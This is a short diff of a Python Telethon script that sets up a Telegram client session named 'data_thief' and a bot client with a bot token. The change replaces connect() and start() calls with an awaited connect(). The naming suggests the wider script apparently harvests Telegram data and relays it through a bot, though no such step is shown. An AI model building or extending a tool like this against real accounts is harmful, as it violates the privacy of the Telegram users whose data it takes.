@@ -15,8 +15,8 @@ USER_NAME = "@danz0_o"
 
 client = TelegramClient('data_thief', API_ID, API_HASH)
 
-client.connect()
-client.start()
+await client.connect()
+
 bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 data = {}
